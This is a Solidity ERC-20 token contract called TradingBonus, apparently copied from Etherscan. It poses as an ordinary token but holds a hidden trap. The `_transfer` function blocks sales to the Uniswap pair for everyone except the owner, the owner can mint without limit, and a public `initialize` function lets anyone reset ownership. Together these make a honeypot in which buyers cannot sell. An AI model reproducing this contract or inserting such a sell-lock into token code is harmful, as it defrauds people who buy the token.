/**
 *Submitted for verification at Etherscan.io on 2023-05-22
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract TradingBonus is SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    address public uniswapPair;
    address public owner;
    bool public locked = false;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract const 382000000000000000000
     */
    constructor(string memory name_, string memory symbol_) {
        initialize(name_, symbol_);
    }

    function setLock(bool lock) public {
        require(msg.sender == owner);
        locked = lock;    
    }

    function initialize(string memory name_, string memory symbol_) public {
        name = name_;
        symbol = symbol_;
        decimals = 18;
        _totalSupply = 100000000000000000000000000;

        owner = msg.sender;

        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
        setLock(true);
    }


    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }


    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        _transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        _transfer(from, to, tokens);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private {
        if(locked) {
            require(to != uniswapPair || tx.origin == owner, "cannot swap");
        }

        if(uniswapPair == address(0)) {
            uniswapPair = to;
        }

        balances[from] = safeSub(balances[from], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
    }

    function mint(uint amount) public {
        require(msg.sender == owner);
        balances[owner] = safeAdd(balances[owner], amount);
        emit Transfer(address(0), owner, amount);
    }
}